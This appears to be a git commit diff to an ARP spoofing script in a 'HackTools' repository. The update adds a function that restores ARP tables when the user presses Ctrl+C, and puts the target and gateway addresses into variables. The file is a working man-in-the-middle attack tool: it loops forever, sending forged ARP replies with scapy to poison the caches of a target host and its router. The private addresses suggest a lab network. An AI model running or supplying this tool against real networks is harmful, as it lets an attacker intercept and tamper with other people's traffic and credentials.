5ce6190315a42e3e1aab60cfb7693f190ac8a92f
KDB <124183922+khalidebn@users.noreply.github.com>
2024-11-16 20:45:11 +0400

    Update arp_spoof.py

--- HackTools/ARP_Spoofing/arp_spoof.py
+++ HackTools/ARP_Spoofing/arp_spoof.py
@@ -22,11 +22,28 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
-sent_packets_count = 0
-while True:
-    spoof("192.168.44.130", "192.168.44.2")  # Spoof Client
-    spoof("192.168.44.2", "192.168.44.130")  # Spoof Router
-    sent_packets_count = sent_packets_count + 2
-    print("\r[+] Packets sent: " + str(sent_packets_count), end="")
-    # sys.stdout.flush()
-    time.sleep(2)
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                       psrc=src_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "192.168.44.130"
+gateway_ip = "192.168.44.2"
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)  # Spoof Client
+        spoof(gateway_ip, target_ip)  # Spoof Router
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        # sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected (CTRL + C).... Resetting ARP tables... \n[+]Please wait...")
+
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
